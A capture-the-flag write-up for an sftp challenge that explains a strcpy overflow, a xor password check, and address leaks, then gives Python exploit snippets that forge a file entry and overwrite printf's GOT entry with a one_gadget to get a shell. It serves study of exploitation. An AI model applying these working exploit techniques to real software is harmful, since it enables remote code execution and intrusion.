# Introduction
This poc only use one vulnerability in the function `new_entry` to get the shell.
The copy of name can bypass the length limitation of name field.
```c
  #define name_max 20
  ...
  *child = malloc(sizeof(entry));
  (*child)->parent_directory = parent;
  (*child)->type = INVALID_ENTRY;
  strcpy((*child)->name, name);
```
# Login
After running the binary we are shown what looks like a standard ssh login. We have to calculate the password to get in.
```
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password:
```
The password is calculated with `xor`, and finally compared with `0x8DFA`. It can be solved by angr or z3, even by yourself.
Finally I figure out one of the passwords is `\x77\x10\x10\x10\x1d`.
```c
  if ( !(unsigned int)__isoc99_scanf("%15s", &v5) )
    return 0LL;
  v3 = _IO_getc(stdin);
  LOWORD(v3) = v5;
  if ( !v5 )
    return 0LL;
  v4 = 0x5417;
  do
  {
    v3 ^= v4;
    ++v0;
    v4 = 2 * v3;
    LOWORD(v3) = *v0;
  }
  while ( (_BYTE)v3 );
  result = 1LL;
  if ( (_WORD)v4 != 0x8DFAu )
    return 0LL;
```
# Leak the address of entry
After login the sftp, we can get the source can in `src/sftp.c`. As mentioned before, we find the function `new_entry` can set up an entry whose name length longger than `name_max`.
According to the `entry struct` and `link_entry struct`, we find that the entry address can be leaked by symlinking a directory/file.
```python
p.recvuntil('sftp> ')
p.sendline('symlink /home/c01db33f /home/c01db33f/'+'a'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('a'*20)
addr = u64(p.recv(4)+'\x00'*4)
```
```c
struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};
...
struct link_entry {
  struct entry entry;
  struct entry* target;
};
```
To get the base address of program, we should get the `parent_directory` of the `/home/c01db33f` entry.
# Leak any address content
To leak any address content, we also use the function `new_entry`.
We find that when the number of child is bigger than `0x10`, it will do realloc, and double the child number.
```c
directory_entry* parent = find_directory(path);
  entry** child = NULL;
  for (size_t i = 0; i < parent->child_count; ++i) {
    if (!parent->child[i]) {
      child = &parent->child[i];
      break;
    }
  }

  if (!child) {
    directory_entry* new_parent = realloc(parent, sizeof(directory_entry) + (parent->child_count * 2 * sizeof(entry*)));
    if (parent != new_parent) {
      update_links((entry*)parent, (entry*)new_parent);
      parent = new_parent;
    }

    for (size_t i = 0; i < parent->child_count; ++i) {
      parent->child[i]->parent_directory = parent;
    }

    child = &parent->child[parent->child_count];
    parent->child_count *= 2;
  }
  ```
So we can make a directory with a long name. The name has to cover 17 childs, and end with the `address-12`.
Then make 17 directories under that directory. The content can be leaked by the command `ls`.
So we can leak the address of program and libc.
  ```c
  struct directory_entry {
  struct entry entry;

  size_t child_count;
  struct entry* child[];
};
```
```python
def leak(addr):
	p.recvuntil('sftp> ')
	p.sendline('mkdir '+'b'*164+p64(addr-12))
	p.recvuntil('sftp> ')
	p.sendline('cd '+'b'*20+'\x10')
	for i in range(0,17):
		p.recvuntil('sftp> ')
		p.sendline('mkdir '+str(i))
	p.recvuntil('sftp> ')
	p.sendline('ls')
	p.recvuntil('16\n')
	addr = p.recv(6)+'\x00'*2
```
# Got hijacking
Now we have the address of program and libc. To get the shell, we can hijack the got.
How to overwrite the Got?
* With the command `put`, we can upload a file whose length is longger than `sizeof(file_entry)`. 
```c
struct file_entry {
  struct entry entry;

  size_t size;
  char* data;
};
```
* Leak the data address in the file_entry
```python
p.recvuntil('sftp> ')
p.sendline('symlink fake_file '+'d'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('d'*20)
put_file = u64(p.recv(4)+'\x00'*4)
print hex(put_file)
fake_file = u64(leak(put_file+40)[0:4]+'\x00'*4)
print hex(fake_file)
```
* With the method of leaking, make a directory include the `data` as a child. And leak the directory address.
```python
p.recvuntil('> ')
p.sendline('cd /home/c01db33f')
p.recvuntil('sftp> ')
p.sendline('mkdir '+'e'*164+p64(fake_file))
p.sendline('symlink '+'e'*20+'\x10 '+'c'*20)
p.recvuntil('sftp> ')
p.sendline('ls')
p.recvuntil('c'*20)
dir_addr = u64(p.recv(4)+'\x00'*4)
print hex(dir_addr)
```
* Rewrite the uploaded file as a fake file_entry. The `data` of fake file_entry is the address of got(printf).
```python
fake_entry = p64(dir_addr) + p64(0x6161616100000002) + p64(0)*2 + p64(16) + p64(base+0x2050b0)
p.recvuntil('sftp> ')
p.sendline('put fake_file')
p.sendline('48')
p.send(fake_entry)
```
* Make 17 directoryies, and rewrite the fake file with one_gadget address(Got hijacking).
```python
p.recvuntil('sftp> ')
p.sendline('cd '+'e'*20+'\x10')
for i in range(0,17):
	p.recvuntil('sftp> ')
	p.sendline('mkdir '+str(i))
p.recvuntil('sftp> ')
p.sendline('ls')

p.recvuntil('sftp> ')
p.sendline('put aaaa')
p.sendline('8')
p.send(p64(one_gadget))
```
